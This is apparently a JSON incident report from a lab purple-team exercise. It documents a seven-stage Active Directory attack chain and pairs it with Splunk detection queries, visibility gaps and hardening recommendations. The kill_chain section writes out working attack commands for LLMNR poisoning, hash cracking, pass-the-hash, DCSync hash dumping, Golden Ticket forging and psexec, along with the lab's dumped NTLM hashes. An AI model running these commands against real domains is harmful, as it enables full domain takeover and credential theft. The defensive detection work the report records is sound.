@@ -1,0 +1,240 @@
+{
+  "incident": {
+    "id": "ATK-001",
+    "title": "Active Directory Full Kill Chain — LLMNR Poisoning to Golden Ticket",
+    "severity": "CRITICAL",
+    "status": "Documented — Lab Exercise",
+    "environment": "CorpLab",
+    "domain": "corp.local",
+    "date": "2026-04-21",
+    "attacker_ip": "10.10.10.99",
+    "target": "DC01.corp.local — 10.10.10.40",
+    "outcome": "Full domain compromise. All domain hashes exfiltrated. Golden Ticket forged. psexec blocked by Defender.",
+    "mitre_techniques": [
+      "T1557.001 - LLMNR/NBT-NS Poisoning",
+      "T1110.002 - Password Cracking",
+      "T1021.006 - WinRM",
+      "T1550.002 - Pass the Hash",
+      "T1003.006 - DCSync",
+      "T1558.001 - Golden Ticket",
+      "T1569.002 - Service Execution"
+    ]
+  },
+  "kill_chain": [
+    {
+      "stage": 1,
+      "name": "LLMNR Poisoning",
+      "technique": "T1557.001",
+      "tool": "Responder",
+      "command": "sudo responder -I eth0 -dwv",
+      "result": "NTLMv2 hash captured for Administrator from 10.10.10.40. Hash saved to /usr/share/responder/logs/SMB-NTLMv2-SSP-fe80::c1b1:46ee:a893:40ea.txt. Captured on IPv6 address.",
+      "detected": false,
+      "detection_note": "VIS-001 — intra-LAN traffic never routes through OPNsense/Suricata."
+    },
+    {
+      "stage": 2,
+      "name": "Hash Cracking",
+      "technique": "T1110.002",
+      "tool": "John the Ripper",
+      "command": "john --format=netntlmv2 --wordlist=/tmp/corp_wordlist.txt /tmp/admin.hash",
+      "result": "CorpWin2025 recovered for Administrator.",
+      "detected": false,
+      "detection_note": "Offline operation — no logging system can detect this."
+    },
+    {
+      "stage": 3,
+      "name": "WinRM Initial Access",
+      "technique": "T1021.006",
+      "tool": "evil-winrm",
+      "command": "evil-winrm -i 10.10.10.40 -u Administrator -p 'CorpWin2025'",
+      "result": "Interactive shell on DC01 as CORP\\Administrator.",
+      "detected": true,
+      "detection_note": "EC4624, NTLM, Logon_Type=3, src_ip=10.10.10.99. 12 events total."
+    },
+    {
+      "stage": 4,
+      "name": "Pass-the-Hash",
+      "technique": "T1550.002",
+      "tool": "evil-winrm",
+      "command": "evil-winrm -i 10.10.10.40 -u Administrator -H 423fe085824dc357762259ddbb2631d2",
+      "result": "Shell on DC01 using NT hash only — no plaintext password needed.",
+      "detected": true,
+      "detection_note": "EC4624, NTLM, src_ip=10.10.10.99. Indistinguishable from Stage 3 in logs."
+    },
+    {
+      "stage": 5,
+      "name": "DCSync",
+      "technique": "T1003.006",
+      "tool": "impacket-secretsdump",
+      "command": "impacket-secretsdump CORP/Administrator:'CorpWin2025'@10.10.10.40",
+      "result": "All domain hashes exfiltrated via DRSUAPI replication protocol.",
+      "hashes_dumped": {
+        "Administrator": "423fe085824dc357762259ddbb2631d2",
+        "krbtgt": "94645007672cec1a5ac3a6ac6c08184e",
+        "jsmith": "2b576acbe6bcfda7294d6bd18041b8fe",
+        "jdoe": "2b576acbe6bcfda7294d6bd18041b8fe",
+        "svc-jenkins": "15a8eccc12c937774986f16cdef99758"
+      },
+      "detected": true,
+      "detection_note": "EC4662 with GUIDs 1131f6aa + 1131f6ad in _raw. 76 events. Must search _raw — Splunk truncates Properties field."
+    },
+    {
+      "stage": 6,
+      "name": "Golden Ticket",
+      "technique": "T1558.001",
+      "tool": "impacket-ticketer",
+      "command": "impacket-ticketer -nthash 94645007672cec1a5ac3a6ac6c08184e -domain-sid S-1-5-21-1380357316-3734788512-141239861 -domain corp.local Administrator",
+      "result": "Forged TGT saved as Administrator.ccache. Valid until krbtgt password reset twice.",
+      "detected": true,
+      "detection_note": "EC4769 for Administrator with zero preceding EC4768. Service tickets with no TGT request = forged ticket."
+    },
+    {
+      "stage": 7,
+      "name": "psexec Attempt",
+      "technique": "T1569.002",
+      "tool": "impacket-psexec",
+      "command": "export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass corp.local/Administrator@DC01.corp.local",
+      "result": "Blocked by Windows Defender. Three attempts — OOwN, rnDL, QYag. Shell never obtained.",
+      "detected": true,
+      "detection_note": "EC7045, random 4-char service names, binary in %systemroot%. 4 events (3 impacket attempts)."
+    }
+  ],
+  "splunk_evidence": [
+    {
+      "detection": "NTLM Admin logon from attacker IP",
+      "query": "index=windows EventCode=4624 Account_Name=Administrator Authentication_Package=NTLM | table _time, Account_Name, src_ip, Logon_Type | sort -_time",
+      "result": "12 events from 10.10.10.99",
+      "event_count": 12
+    },
+    {
+      "detection": "DCSync replication rights abuse",
+      "query": "index=windows EventCode=4662 | search _raw=\"*1131f6aa*\" OR _raw=\"*1131f6ad*\" | where NOT match(Account_Name, \"\\\\$$\")",
+      "result": "76 events — Administrator triggering both replication GUIDs",
+      "event_count": 76
+    },
+    {
+      "detection": "Golden Ticket — no prior TGT",
+      "query": "index=windows (EventCode=4768 OR EventCode=4769) Account_Name=\"Administrator@CORP.LOCAL\" | table _time, EventCode, Service_Name",
+      "result": "8 x EC4769 — zero EC4768 for Administrator",
+      "event_count": 8
+    },
+    {
+      "detection": "psexec service install",
+      "query": "index=windows EventCode=7045 | where match(Service_Name, \"^[A-Za-z]{4}$\")",
+      "result": "4 events — OOwN, rnDL, QYag service names",
+      "event_count": 4
+    }
+  ],
+  "iocs": {
+    "attacker_ip": "10.10.10.99",
+    "compromised_accounts": ["Administrator", "krbtgt", "jsmith", "jdoe", "svc-jenkins"],
+    "administrator_ntlm": "423fe085824dc357762259ddbb2631d2",
+    "krbtgt_ntlm": "94645007672cec1a5ac3a6ac6c08184e",
+    "golden_ticket_file": "Administrator.ccache",
+    "psexec_service_names": ["OOwN", "rnDL", "QYag"],
+    "tools_used": ["Responder", "John the Ripper", "evil-winrm", "impacket-secretsdump", "impacket-ticketer", "impacket-psexec"]
+  },
+  "detections": [
+    {
+      "id": "DET-001-01",
+      "name": "NTLM Admin logon from attacker IP",
+      "eventcode": "4624",
+      "filter": "Authentication_Package=NTLM AND Account_Name=Administrator AND src_ip=10.10.10.99",
+      "evidence_found": true,
+      "event_count": 12,
+      "mitre": "T1550.002 / T1021.006",
+      "severity": "High"
+    },
+    {
+      "id": "DET-001-02",
+      "name": "DCSync replication rights abuse",
+      "eventcode": "4662",
+      "filter": "_raw contains 1131f6aa or 1131f6ad, Account_Name not ending in $",
+      "evidence_found": true,
+      "event_count": 76,
+      "mitre": "T1003.006",
+      "severity": "Critical"
+    },
+    {
+      "id": "DET-001-03",
+      "name": "Golden Ticket — no prior TGT",
+      "eventcode": "4769",
+      "filter": "Service_Name=krbtgt OR (Admin + DC01$ + no 4768)",
+      "evidence_found": true,
+      "event_count": 8,
+      "mitre": "T1558.001",
+      "severity": "Critical"
+    },
+    {
+      "id": "DET-001-04",
+      "name": "WinRM network connection",
+      "eventcode": "Sysmon EC3",
+      "filter": "DestinationPort=5985",
+      "evidence_found": false,
+      "gap": "VIS-002",
+      "mitre": "T1021.006",
+      "severity": "Gap"
+    },
+    {
+      "id": "DET-001-05",
+      "name": "psexec service installation",
+      "eventcode": "7045",
+      "filter": "Service_Name matches ^[A-Za-z]{4}$ AND Service_File_Name contains %systemroot%",
+      "evidence_found": true,
+      "event_count": 4,
+      "mitre": "T1569.002",
+      "severity": "High"
+    }
+  ],
+  "visibility_gaps": [
+    {
+      "id": "VIS-001",
+      "description": "Suricata blind to all intra-LAN attacks",
+      "impact": "LLMNR, WinRM, PtH, DCSync, Golden Ticket invisible at network layer",
+      "fix": "vSwitch port mirroring — SPAN to OPNsense em1 (Sprint 4)"
+    },
+    {
+      "id": "VIS-002",
+      "description": "Sysmon not confirmed flowing to Splunk",
+      "impact": "No network connection telemetry from DC01",
+      "fix": "Verify Sysmon install and UF inputs.conf on dc-vm (Sprint 4)"
+    },
+    {
+      "id": "VIS-003",
+      "description": "Offline hash cracking undetectable",
+      "impact": "Stage 2 permanently invisible",
+      "fix": "Accepted — prevent hash theft upstream by disabling LLMNR"
+    }
+  ],
+  "infrastructure_fixes": [
+    {
+      "fix": "src_ip field extraction",
+      "file": "/opt/splunk/etc/system/local/props.conf",
+      "host": "blue-vm",
+      "description": "Custom regex to parse Source Network Address from Windows Security events"
+    },
+    {
+      "fix": "DS Access auditing",
+      "command": "auditpol /set /subcategory:\"Directory Service Access\" /success:enable /failure:enable",
+      "host": "DC01",
+      "description": "Enables EC4662 generation for DCSync detection"
+    },
+    {
+      "fix": "Suricata EVE syslog facility",
+      "file": "/usr/local/etc/suricata/suricata.yaml",
+      "host": "OPNsense",
+      "description": "Changed facility local5 to local6 to separate EVE JSON from general syslog"
+    }
+  ],
+  "sigma_rule": "sigma_dcsync_T1003.006.yml",
+  "detection_rate": "5/7 stages (71%)",
+  "recommendations": [
+    "Disable LLMNR via GPO immediately — CorpDisableLLMNR GPO already exists, enable it",
+    "Disable NBT-NS on all hosts",
+    "Reset krbtgt password twice with 10-hour gap to invalidate Golden Ticket",
+    "Enforce SMB signing on all hosts not just DCs",
+    "Install Sysmon on DC01 and verify forwarding to Splunk (close VIS-002)",
+    "Implement LAPS for local admin passwords",
+    "Enable Protected Users security group for privileged accounts"
+  ]
+}
